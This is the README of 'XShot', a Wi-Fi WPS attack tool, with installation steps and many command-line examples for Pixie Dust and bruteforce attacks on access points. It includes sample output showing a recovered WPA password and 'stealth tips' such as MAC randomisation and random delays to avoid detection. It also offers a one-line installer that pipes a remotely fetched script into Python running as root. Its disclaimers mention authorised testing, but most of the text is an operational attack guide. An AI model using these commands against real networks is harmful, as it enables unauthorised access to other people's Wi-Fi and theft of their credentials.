XShot - Premium WPS Attack Tool 🚀

📌 Overview

XShot is an advanced WPS (Wi-Fi Protected Setup) security testing tool that combines Pixie Dust and bruteforce attacks. This tool is designed for educational purposes and authorized penetration testing only.

```
██╗  ██╗███████╗██╗  ██╗ ██████╗ ████████╗
╚██╗██╔╝██╔════╝██║  ██║██╔═══██╗╚══██╔══╝
 ╚███╔╝ ███████╗███████║██║   ██║   ██║   
 ██╔██╗ ╚════██║██╔══██║██║   ██║   ██║   
██╔╝ ██╗███████║██║  ██║╚██████╔╝   ██║   
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝    ⚠️
```

⚠️ DISCLAIMER: For educational/authorized testing only. Team AX is not responsible for misuse.

🚀 Quick Installation

One-Line Install (Recommended)

```bash
# Download and install in one command
sudo python -c "$(curl -fsSL https://raw.githubusercontent.com/KhalidAX003/xshot/main/install.py)"
```

Manual Installation

```bash
# 1. Clone repository
git clone https://github.com/KhalidAX003/xshot.git
cd xshot

# 2. Run setup script
sudo python setup.py

# 3. Verify installation
xshot --version
```

Update Existing Installation

```bash
# Update to latest version
sudo python setup.py --update
```

Uninstall

```bash
# Remove XShot
sudo python setup.py --uninstall
```

📋 System Requirements

Minimum Requirements

· OS: Linux (Kali, Ubuntu, Parrot) or Android (Termux)
· Python: 3.6 or higher
· Root access: Required for wireless operations
· Wireless card: Must support monitor mode

Recommended Hardware

· Wireless adapter with packet injection support
· 2GB RAM minimum
· Dual-core processor

🔧 Setup Script Features

The setup.py script automatically handles:

✅ Automatic dependency installation
✅ Pixiewps compilation/installation
✅ System-wide command setup
✅ Configuration file creation
✅ Vulnerability database download
✅ Bash completion setup
✅ Wireless capability testing
✅ Update management

🎯 Quick Start Guide

Step 1: Install

```bash
sudo python setup.py
```

Step 2: Scan Networks

```bash
sudo xshot -i wlan0 --scan
```

Step 3: Attack

```bash
# Pixie Dust attack
sudo xshot -i wlan0 -K

# With specific target
sudo xshot -i wlan0 -b AA:BB:CC:DD:EE:FF -K
```

⚡ Essential Commands

Network Discovery

```bash
# Scan for WPS networks
sudo xshot -i wlan0 --scan

# Scan with details
sudo xshot -i wlan0 --scan -v

# Scan specific channel
sudo xshot -i wlan0 --scan --channel 6
```

Attack Modes

```bash
# 1. Pixie Dust (Fastest)
sudo xshot -i wlan0 -K

# 2. Bruteforce
sudo xshot -i wlan0 -B

# 3. Push Button Connect
sudo xshot -i wlan0 --pbc

# 4. Smart Attack (Auto-select)
sudo xshot -i wlan0 --auto
```

Target Selection

```bash
# Attack specific AP
sudo xshot -i wlan0 -b 00:11:22:33:44:55 -K

# Use specific PIN
sudo xshot -i wlan0 -b 00:11:22:33:44:55 -p 12345670

# Attack from scan results
# (Will show interactive menu)
sudo xshot -i wlan0
```

Advanced Options

```bash
# Stealth mode
sudo xshot -i wlan0 -K --stealth

# Save credentials
sudo xshot -i wlan0 -K -w

# Verbose output
sudo xshot -i wlan0 -K -v

# Add delay between attempts
sudo xshot -i wlan0 -B -d 2
```

📱 Android/Termux Setup

Termux Installation

```bash
# Install dependencies
pkg update && pkg upgrade
pkg install python git root-repo -y
pkg install tsu wireless-tools -y

# Install XShot
git clone https://github.com/KhalidAX003/xshot.git
cd xshot
python setup.py

# Run as root
sudo python xshot.py -i wlan0 --scan
```

Important for Android

Before running on Android:

1. Turn OFF Mobile Hotspot
2. Turn ON Location Services
3. Enable GPS
4. Run: termux-location

🔧 Troubleshooting

Common Issues

1. "Command not found" after install

```bash
# Add to PATH
export PATH=$PATH:~/.local/bin

# Or run directly
sudo python /path/to/xshot/xshot.py -i wlan0 -K
```

2. "No wireless interface found"

```bash
# Check available interfaces
iwconfig

# Put interface in monitor mode
sudo airmon-ng start wlan0
sudo xshot -i wlan0mon -K
```

3. "Pixiewps not found"

```bash
# Install manually
sudo apt install pixiewps -y
# OR compile from source
git clone https://github.com/wiire/pixiewps
cd pixiewps
make
sudo make install
```

4. Permission denied

```bash
# Run as root
sudo su
python xshot.py -i wlan0 --scan
```

Wireless Card Compatibility

Test if your card supports monitor mode:

```bash
sudo airmon-ng
sudo iw list | grep -i monitor
```

📊 Output Examples

Network Scan Output

```
[+] Scanning networks...
[+] Found 3 WPS-enabled networks:

1) B8:27:EB:12:34:56 - HomeWiFi (WPA2, Signal: -45dB)
2) AA:BB:CC:DD:EE:FF - OfficeNet (WPA2, Signal: -62dB) 
3) 11:22:33:44:55:66 - GuestWiFi (WPA, Signal: -71dB)

Select target (1-3): 1
```

Successful Attack

```
[*] Starting Pixie Dust attack on B8:27:EB:12:34:56...
[!] Vulnerable to Pixie Dust!
[+] WPS PIN: 12345670
[+] WPA PSK: MySecurePassword123
[+] SSID: HomeWiFi
[✓] Attack completed in 2.3 seconds
[i] Credentials saved to ~/.xshot/reports/
```

⚙️ Configuration

Config File Location

```
~/.xshot/config.ini
```

Edit Configuration

```bash
# Edit config
nano ~/.xshot/config.ini

# Example config:
[General]
language = en
auto_update = true

[Attack]
default_mode = pixie
stealth = false
threads = 4
```

📁 File Structure

After installation:

```
~/.xshot/
├── config.ini          # Configuration
├── sessions/           # Saved bruteforce sessions
├── logs/              # Attack logs
├── reports/           # Success reports
└── database/          # Vulnerability database
```

🆘 Getting Help

Show All Options

```bash
xshot --help
```

Check Version

```bash
xshot --version
```

Update Tool

```bash
sudo xshot --update
# OR
sudo python setup.py --update
```

Common Help Commands

```bash
# Show brief help
xshot -h

# Show attack-specific help
xshot --help-attack

# Show examples
xshot --examples
```

⚠️ Legal & Ethical Use

Rules of Engagement

1. Only test networks you own or have written permission to test
2. Respect privacy - Don't access others' networks
3. Follow local laws - Wireless hacking laws vary by country
4. Report vulnerabilities - Help improve security

For Educational Use

· Use in controlled lab environments
· Set up your own test network
· Learn how WPS vulnerabilities work
· Understand wireless security principles

🔄 Update Process

Automatic Updates

The tool checks for updates on startup. To manually update:

```bash
# Method 1: Using XShot itself
sudo xshot --update

# Method 2: Using setup.py
sudo python setup.py --update

# Method 3: Git pull
cd xshot
git pull
sudo python setup.py
```

Update Features

· Automatic dependency updates
· New vulnerability database
· Bug fixes and improvements
· New attack methods

🤝 Support & Community

Documentation

· GitHub: https://github.com/KhalidAX003/xshot
· Website: https://team-ax.top/
· Wiki: Detailed usage guides

Report Issues

```bash
# Check existing issues
xshot --issues

# Enable debug mode
sudo xshot -i wlan0 -K -v --debug

# Save debug log
sudo xshot -i wlan0 -K 2>&1 | tee debug.log
```

🎯 Pro Tips

For Better Results

1. Strong signal - Stay close to target AP
2. Be patient - Some attacks take time
3. Try multiple methods - Not all APs are vulnerable to Pixie Dust
4. Update regularly - New vulnerabilities are discovered often

Performance Optimization

```bash
# Close unnecessary programs
# Use wired internet connection
# Disable power saving on wireless card
sudo iwconfig wlan0 power off
```

Stealth Tips

```bash
# Use random MAC address
sudo macchanger -r wlan0

# Add random delays
sudo xshot -i wlan0 -K --stealth --random-delay

# Limit attack time
sudo xshot -i wlan0 -K --time-limit 300
```

📝 License & Credits

Tool: XShot WPS Attack Tool
Version: 2.0 Premium
Author: Team AX
License: For educational use only
Website: https://team-ax.top/

Third-Party Credits

· Pixiewps by wiire
· WPA Supplicant team
· Various WPS researchers

---

Remember: With great power comes great responsibility. Use this tool ethically, legally, and only for improving security awareness.

Start using: sudo xshot -i wlan0 --scan

Need help?: xshot --help or check GitHub issues
